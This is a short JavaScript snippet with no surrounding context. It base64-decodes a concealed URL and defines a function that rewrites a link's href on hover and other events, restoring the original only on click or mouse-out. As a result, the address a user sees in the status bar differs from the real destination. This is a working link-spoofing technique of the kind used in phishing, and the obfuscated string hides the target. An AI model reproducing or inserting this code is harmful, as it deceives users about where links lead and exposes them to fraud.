var site = atob("aHR0cHM6Ly9wcm9wYWdhbmRvZmVsaWNpZGFkZS5vbmxpbmUvYXByZXNlbnRhY2Fv");

function showNiceLink(el,e){
    e = e || event;
    el.originalHref = el.originalHref || el.href;
    console.log(e.type);
    if (/click|out/i.test(e.type)){
        return el.href = el.originalHref;
    } else {
        el.href = site;
    }
}